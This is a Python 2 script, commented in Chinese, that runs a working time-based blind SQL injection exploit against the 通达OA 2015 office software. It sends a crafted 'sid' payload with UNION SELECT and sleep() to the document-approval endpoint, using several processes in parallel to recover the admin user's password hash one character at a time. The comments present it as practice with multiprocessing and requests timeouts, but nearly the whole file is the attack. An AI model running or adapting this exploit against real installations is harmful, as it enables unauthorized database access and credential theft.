#!/usr/bin/env python
# -*- coding:utf8 -*-


"""
多进程 猜测口令

以通达0A 2015 （更新日期为20160722）版本SQL注入漏洞为测试对象，爆破默认管理员admin的密码hash（unix 格式）


用到的多进程间数据共享技术

Queue

Manager


如果是不变的数据，可以不用multiprocessing.Queue 或 multiprocessing.Manager 等多进程共享技术

因为子进程会拷贝父进程的所有数据（但子进程中修改数据，不会反映到父进程中， 所以需要多进程同步数据技术）


关于requests.post 中的timeout

timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，
而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）

与timeout 有关的exception

requests.ReadTimeout

    The server did not send any data in the allotted amount of time.

requests.Timeout

    The request timed out.

    Catching this error will catch both ConnectTimeout and ReadTimeout errors


"""

import sys
import time
import requests
import multiprocessing
from multiprocessing import Process
from multiprocessing import Queue
from multiprocessing import RLock
from multiprocessing import Manager


class GuessPassword(object):
    def __init__(self, passwd_length, processes=6, timeout=3):
        self.result = Manager().dict()
        self.stop_flag = Manager().list()
        self.worker_list = []
        self.processes = processes
        self.timeout = timeout
        self.queue = Queue()
        self.lock = RLock()
        self.cookie = {'_SERVER': ''}
        self.passwd_length = passwd_length
        self.url = "http://localhost/general/document/index.php/send/approve/finish"
        self.payload = "1) and char(@`'`)  union select if(ord(mid(PASSWORD,{position},1))={guess_char},sleep(4),1),1 from user WHERE BYNAME = 0x61646d696e #and char(@`'`)"

        self.stop_flag.append(False)  # 这里不能写成 self.stop_flag[0] = False, 否则会提示 indexOutRange
        for _ in range(1, self.passwd_length):
            self.queue.put(_)

    def exploit(self):
        while not self.queue.empty() and not self.stop_flag[0]:
            passwd_position = self.queue.get()
            for _guess_char in range(33, 128):
                payload = self.payload.format(position=passwd_position, guess_char=_guess_char)
                exp_data = {'sid': payload}
                try:
                    res = requests.post(self.url, data=exp_data, cookies=self.cookie, timeout=self.timeout)
                except requests.ReadTimeout:
                    self.lock.acquire()
                    self.result[passwd_position] = chr(_guess_char)
                    print "Data %dth: %s" % (passwd_position, self.result[passwd_position])
                    self.lock.release()
                    break

    def run(self):

        for _ in range(self.processes):
            _worker = Process(target=self.exploit)
            # _worker.daemon = True
            _worker.start()

        try:
            while len(
                    multiprocessing.active_children()) > 2:  # 为什么不是大于0呢， 当所有工作子进程都结束之后，还有两个子进程在运行，那就是两个Manager 子进程（用于多进程共享数据）；multiprocessing.active_children() 返回的是当前活动进程对象的list
                # self.lock.acquire()
                # print len(multiprocessing.active_children())
                # self.lock.release()
                time.sleep(1)
        except KeyboardInterrupt:
            self.lock.acquire()
            print 'wait for all subprocess stop......'
            self.stop_flag[0] = True
            self.lock.release()

        else:
            print self.result
            print 'finish'


if __name__ == '__main__':
    reload(sys)
    sys.setdefaultencoding('utf8')
    GuessPassword(14).run()
